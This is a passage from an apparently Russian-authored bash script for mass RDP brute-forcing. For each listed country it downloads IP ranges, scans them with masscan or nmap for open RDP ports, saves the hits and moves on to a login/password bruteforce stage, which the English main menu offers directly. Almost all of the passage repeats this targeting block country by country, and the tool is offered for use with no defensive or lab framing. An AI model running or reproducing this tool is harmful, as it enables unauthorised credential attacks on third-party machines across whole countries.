echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "190" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UGANDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uganda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "191" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UKRAINE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ukraine://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "192" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+ARAB+EMIRATES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United Arab Emirates://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "193" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+KINGDOM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United Kingdom://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "194" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+STATES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United States://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "195" ]; then
curl http://services.ce3c.be/ciprg/?countrys=URUGUAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uruguay://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "196" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UZBEKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uzbekistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "197" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VANUATU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Vanuatu://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "198" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VENEZUELA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Venezuela://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "199" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIET+NAM.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Viet Nam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "200" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIRGIN+ISLANDS+%28BRITISH%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Virgin Islands (BRITISH)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "201" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIRGIN+ISLANDS+%28U.S.%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Virgin Islands (U.S.)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "202" ]; then
curl http://services.ce3c.be/ciprg/?countrys=YEMEN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Yemen://g" > list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list  --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "203" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ZAMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Zambia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "204" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ZIMBABWE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Zimbabwe://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green*Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
if [ "$menuoption" = "5" ]; then

CLEARALL
exit;
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
}
########################################################MENUENG####################################
MENUENG ()
{
echo -e "$aquamarine            ************************************Main menu**********************************$colorbase";
echo ""
echo -e "               +-----------------------------------------------------------------------+"
echo -e "               |        $grey 1.$yellow Scan range to find an open RDP port (manual entry)$colorbase         | ";
echo -e "               |        $grey 2.$yellow Scan range to find an open RDP port (from a file)$colorbase          | ";
echo -e "               |        $grey 3.$yellow Bruteforce Username/Password (last scan)$colorbase                   | ";
echo -e "               |        $grey 4.$yellow Range of IP for the country$colorbase                                | ";
echo -e "               |        $grey 5.$yellow Exit ($red[ENTER]$yellow) $colorbase                                            | ";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Сhoose from a menu : " menuoption

if [ "$menuoption" = "1" ]; then
echo -e "$red--------------------------------------------------------------------------------------------------------$aquamarine"
read -p "Enter the range or single IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                      1.$yellow Nmap (Single IP)$colorbase                           |";
echo -e "               |   $grey                      2.$yellow Masscan$colorbase                                    |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                            Select scanner : " scan
clear
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode $red'CTRL+C'$colorbase"
if [ "$scan" = "1" ]; then
nmap -Pn -sS $target -p $port --open  | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

	else
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done


